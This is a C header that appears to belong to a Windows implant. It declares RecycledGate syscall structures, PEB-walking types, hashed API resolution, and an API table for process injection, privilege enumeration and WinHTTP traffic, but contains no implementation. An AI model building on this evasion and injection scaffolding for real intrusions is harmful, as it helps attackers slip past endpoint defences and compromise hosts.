#ifndef TYPEDEFS_H
#define TYPEDEFS_H

#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>

// =============================================================================
// RecycledGate Syscall structure
// =============================================================================
typedef struct {
    DWORD dwSyscallNr;
    PVOID pRecycledGate;
} Syscall;

// =============================================================================
// Custom UNICODE_STR (different from UNICODE_STRING in winternl.h)
// =============================================================================
typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

// =============================================================================
// PEB/LDR structures - use custom versions to avoid winternl.h conflicts
// These are wrapped with guards in case winternl.h is included
// =============================================================================

#ifndef _OBJECT_ATTRIBUTES_DEFINED
#define _OBJECT_ATTRIBUTES_DEFINED
typedef struct _MANA_OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STR    ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} MANA_OBJECT_ATTRIBUTES, * PMANA_OBJECT_ATTRIBUTES;
#endif

// Custom PEB structures with full member access (not Reserved arrays)
typedef struct _MANA_PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} MANA_PEB_LDR_DATA, * PMANA_PEB_LDR_DATA;

typedef struct _MANA_LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} MANA_LDR_DATA_TABLE_ENTRY, * PMANA_LDR_DATA_TABLE_ENTRY;

typedef struct _MANA_PEB_FREE_BLOCK
{
    struct _MANA_PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} MANA_PEB_FREE_BLOCK, * PMANA_PEB_FREE_BLOCK;

typedef struct _MANA_PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PMANA_PEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PMANA_PEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} MANA_PEB, * PMANA_PEB;

#ifndef _CLIENT_ID_DEFINED
#define _CLIENT_ID_DEFINED
typedef struct _MANA_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} MANA_CLIENT_ID, * PMANA_CLIENT_ID;
#endif

// =============================================================================
// Macros
// =============================================================================
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( MANA_OBJECT_ATTRIBUTES );   \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;             \
}

// =============================================================================
// Function declarations for RecycledGate
// =============================================================================
PVOID findNtDll(void);
WCHAR* toLower(WCHAR* str);

extern void PrepareSyscall(DWORD dwSyscallNr, PVOID pGate);
extern NTSTATUS DoSyscall();

PVOID findNtDll(void);
DWORD getSyscall(DWORD crypted_hash, Syscall* pSyscall);

unsigned long djb2_unicode(const wchar_t* str);
unsigned long djb2(unsigned char* str);
unsigned long xor_hash(unsigned long hash);

// =============================================================================
// APC Routine type
// =============================================================================
typedef VOID(KNORMAL_ROUTINE) (
    IN PVOID NormalContext,
    IN PVOID SystemArgument1,
    IN PVOID SystemArgument2);

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

// =============================================================================
// ADVAPI32.dll function pointers
// =============================================================================
typedef BOOL    (WINAPI* fnGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef BOOL    (WINAPI* fnGetUserNameA)(LPSTR, LPDWORD);
typedef BOOL    (WINAPI* fnLookupPrivilegeDisplayNameA)(LPCSTR, LPCSTR, LPSTR, LPDWORD, LPDWORD);
typedef BOOL    (WINAPI* fnLookupPrivilegeNameA)(LPCSTR, PLUID, LPSTR, LPDWORD);
typedef BOOL    (WINAPI* fnOpenProcessToken)(HANDLE, DWORD, PHANDLE);

// =============================================================================
// IPHLPAPI.DLL function pointers
// =============================================================================
typedef ULONG   (WINAPI* fnGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);

// =============================================================================
// KERNEL32.dll function pointers
// =============================================================================
typedef BOOL    (WINAPI* fnCloseHandle)(HANDLE);
typedef HANDLE  (WINAPI* fnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI* fnCreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL    (WINAPI* fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef void    (WINAPI* fnDeleteCriticalSection)(LPCRITICAL_SECTION);
typedef void    (WINAPI* fnEnterCriticalSection)(LPCRITICAL_SECTION);
typedef void    (WINAPI* fnExitProcess)(UINT);
typedef BOOL    (WINAPI* fnFileTimeToLocalFileTime)(const FILETIME*, LPFILETIME);
typedef BOOL    (WINAPI* fnFileTimeToSystemTime)(const FILETIME*, LPSYSTEMTIME);
typedef BOOL    (WINAPI* fnFindClose)(HANDLE);
typedef HANDLE  (WINAPI* fnFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI* fnFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL    (WINAPI* fnGetComputerNameExA)(COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
typedef DWORD   (WINAPI* fnGetCurrentDirectoryA)(DWORD, LPSTR);
typedef HANDLE  (WINAPI* fnGetCurrentProcess)(void);
typedef DWORD   (WINAPI* fnGetCurrentProcessId)(void);
typedef DWORD   (WINAPI* fnGetFileSize)(HANDLE, LPDWORD);
typedef DWORD   (WINAPI* fnGetFullPathNameA)(LPCSTR, DWORD, LPSTR, LPSTR*);
typedef DWORD   (WINAPI* fnGetLastError)(void);
typedef DWORD   (WINAPI* fnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef HMODULE (WINAPI* fnGetModuleHandleA)(LPCSTR);
typedef FARPROC (WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
typedef void    (WINAPI* fnGetStartupInfoA)(LPSTARTUPINFOA);
typedef DWORD   (WINAPI* fnGetTickCount)(void);
typedef void    (WINAPI* fnInitializeCriticalSection)(LPCRITICAL_SECTION);
typedef BOOL    (WINAPI* fnIsDBCSLeadByteEx)(UINT, BYTE);
typedef void    (WINAPI* fnLeaveCriticalSection)(LPCRITICAL_SECTION);
typedef HLOCAL  (WINAPI* fnLocalAlloc)(UINT, SIZE_T);
typedef HLOCAL  (WINAPI* fnLocalFree)(HLOCAL);
typedef HLOCAL  (WINAPI* fnLocalReAlloc)(HLOCAL, SIZE_T, UINT);
typedef int     (WINAPI* fnMultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef BOOL    (WINAPI* fnPeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
typedef DWORD   (WINAPI* fnQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef BOOL    (WINAPI* fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD   (WINAPI* fnResumeThread)(HANDLE);
typedef BOOL    (WINAPI* fnSetCurrentDirectoryA)(LPCSTR);
typedef BOOL    (WINAPI* fnSetHandleInformation)(HANDLE, DWORD, DWORD);
typedef LPTOP_LEVEL_EXCEPTION_FILTER (WINAPI* fnSetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER);
typedef void    (WINAPI* fnSleep)(DWORD);
typedef BOOL    (WINAPI* fnTerminateProcess)(HANDLE, UINT);
typedef LPVOID  (WINAPI* fnTlsGetValue)(DWORD);
typedef LPVOID  (WINAPI* fnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI* fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI* fnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef SIZE_T  (WINAPI* fnVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef DWORD   (WINAPI* fnWaitForSingleObject)(HANDLE, DWORD);
typedef int     (WINAPI* fnWideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef BOOL    (WINAPI* fnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

// =============================================================================
// WINHTTP.dll function pointers
// =============================================================================
typedef BOOL      (WINAPI* fnWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);
typedef BOOL      (WINAPI* fnWinHttpCloseHandle)(HINTERNET);
typedef HINTERNET (WINAPI* fnWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI* fnWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI* fnWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL      (WINAPI* fnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI* fnWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL      (WINAPI* fnWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI* fnWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);

// =============================================================================
// API Table
// =============================================================================
typedef struct _API_TABLE {
    // KERNEL32
    fnCloseHandle                     CloseHandle;
    fnCreateFileA                     CreateFileA;
    fnCreatePipe                      CreatePipe;
    fnCreateProcessA                  CreateProcessA;
    fnDeleteCriticalSection           DeleteCriticalSection;
    fnEnterCriticalSection            EnterCriticalSection;
    fnExitProcess                     ExitProcess;
    fnFileTimeToLocalFileTime         FileTimeToLocalFileTime;
    fnFileTimeToSystemTime            FileTimeToSystemTime;
    fnFindClose                       FindClose;
    fnFindFirstFileA                  FindFirstFileA;
    fnFindNextFileA                   FindNextFileA;
    fnGetComputerNameExA              GetComputerNameExA;
    fnGetCurrentDirectoryA            GetCurrentDirectoryA;
    fnGetCurrentProcess               GetCurrentProcess;
    fnGetCurrentProcessId             GetCurrentProcessId;
    fnGetFileSize                     GetFileSize;
    fnGetFullPathNameA                GetFullPathNameA;
    fnGetLastError                    GetLastError;
    fnGetModuleFileNameA              GetModuleFileNameA;
    fnGetModuleHandleA                GetModuleHandleA;
    fnGetProcAddress                  GetProcAddress;
    fnGetStartupInfoA                 GetStartupInfoA;
    fnGetTickCount                    GetTickCount;
    fnInitializeCriticalSection       InitializeCriticalSection;
    fnIsDBCSLeadByteEx                IsDBCSLeadByteEx;
    fnLeaveCriticalSection            LeaveCriticalSection;
    fnLocalAlloc                      LocalAlloc;
    fnLocalFree                       LocalFree;
    fnLocalReAlloc                    LocalReAlloc;
    fnMultiByteToWideChar             MultiByteToWideChar;
    fnPeekNamedPipe                   PeekNamedPipe;
    fnQueueUserAPC                    QueueUserAPC;
    fnReadFile                        ReadFile;
    fnResumeThread                    ResumeThread;
    fnSetCurrentDirectoryA            SetCurrentDirectoryA;
    fnSetHandleInformation            SetHandleInformation;
    fnSetUnhandledExceptionFilter     SetUnhandledExceptionFilter;
    fnSleep                           Sleep;
    fnTerminateProcess                TerminateProcess;
    fnTlsGetValue                     TlsGetValue;
    fnVirtualAllocEx                  VirtualAllocEx;
    fnVirtualProtect                  VirtualProtect;
    fnVirtualProtectEx                VirtualProtectEx;
    fnVirtualQuery                    VirtualQuery;
    fnWaitForSingleObject             WaitForSingleObject;
    fnWideCharToMultiByte             WideCharToMultiByte;
    fnWriteFile                       WriteFile;
    fnWriteProcessMemory              WriteProcessMemory;

    // ADVAPI32
    fnGetUserNameA                    GetUserNameA;
    fnGetTokenInformation             GetTokenInformation;
    fnLookupPrivilegeNameA            LookupPrivilegeNameA;
    fnLookupPrivilegeDisplayNameA     LookupPrivilegeDisplayNameA;
    fnOpenProcessToken                OpenProcessToken;

    // IPHLPAPI
    fnGetAdaptersInfo                 GetAdaptersInfo;

    // WINHTTP
    fnWinHttpAddRequestHeaders        WinHttpAddRequestHeaders;
    fnWinHttpCloseHandle              WinHttpCloseHandle;
    fnWinHttpConnect                  WinHttpConnect;
    fnWinHttpOpen                     WinHttpOpen;
    fnWinHttpOpenRequest              WinHttpOpenRequest;
    fnWinHttpReadData                 WinHttpReadData;
    fnWinHttpReceiveResponse          WinHttpReceiveResponse;
    fnWinHttpSendRequest              WinHttpSendRequest;
    fnWinHttpSetOption                WinHttpSetOption;
} API_TABLE;

extern API_TABLE Api;
void initializeAPI();

#endif // TYPEDEFS_H
